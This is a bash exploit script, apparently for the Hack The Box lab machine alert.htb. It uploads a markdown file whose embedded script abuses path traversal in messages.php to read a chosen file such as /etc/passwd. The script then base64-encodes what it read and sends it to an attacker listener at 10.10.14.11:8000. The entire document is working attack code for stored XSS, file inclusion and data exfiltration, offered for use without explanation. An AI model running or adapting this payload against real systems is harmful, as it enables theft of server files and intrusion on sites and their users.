#!/bin/bash
# Check if an argument was provided
if [ $# -eq 0 ]; then
    echo "Usage: $0 <filepath>"
    echo "Example: $0 /etc/passwd"
    exit 1
fi

# Store the user-provided filepath
FILEPATH="$1"

# URL encode the filepath to handle special characters
# This function properly encodes special characters for URL transmission
url_encode() {
    local string="$1"
    local length="${#string}"
    local encoded=""
    
    for (( i=0; i<length; i++ )); do
        local c="${string:$i:1}"
        case "$c" in
            [a-zA-Z0-9.~_-]) encoded+="$c" ;;
            *) printf -v encoded '%s%%%02X' "$encoded" "'$c" ;;
        esac
    done
    
    echo "$encoded"
}

# URL encode the filepath
ENCODED_FILEPATH=$(url_encode "$FILEPATH")

# For debugging (optional)
# echo "Original path: $FILEPATH"
# echo "Encoded path: $ENCODED_FILEPATH"

# Create the payload with properly encoded filepath
# Note: We first URL encode for the XHR request, then we escape for the shell
PAYLOAD="<script>
var xmlHttp = new XMLHttpRequest();
xmlHttp.open(\"POST\", \"http://alert.htb/messages.php?file=../../../../../../../../../../../../$ENCODED_FILEPATH\", false);
xmlHttp.send();
var xmlHttp2 = new XMLHttpRequest();
xmlHttp2.open(\"GET\", \"http://10.10.14.11:8000?suction=\"+btoa(xmlHttp.responseText), true);
xmlHttp2.send();
</script>"

curl --path-as-is -s -k -X $'POST' \
    -H $'Host: alert.htb' \
    -H $'Cache-Control: max-age=0' \
    -H $'Accept-Language: en-US,en;q=0.9' \
    -H $'Origin: http://alert.htb' \
    -H $'Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1kJRTLTBhkMaRCT8' \
    -H $'Upgrade-Insecure-Requests: 1' \
    -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36' \
    -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
    -H $'Referer: http://alert.htb/index.php?page=alert' \
    -H $'Connection: keep-alive' \
    --compressed \
    --data-binary "------WebKitFormBoundary1kJRTLTBhkMaRCT8
Content-Disposition: form-data; name=\"file\"; filename=\"exploit3.md\"
Content-Type: text/markdown

$PAYLOAD
------WebKitFormBoundary1kJRTLTBhkMaRCT8--
" \
    $'http://alert.htb/visualizer.php' | grep -o 'href="[^"]*"' | grep -o 'http://[^"]*'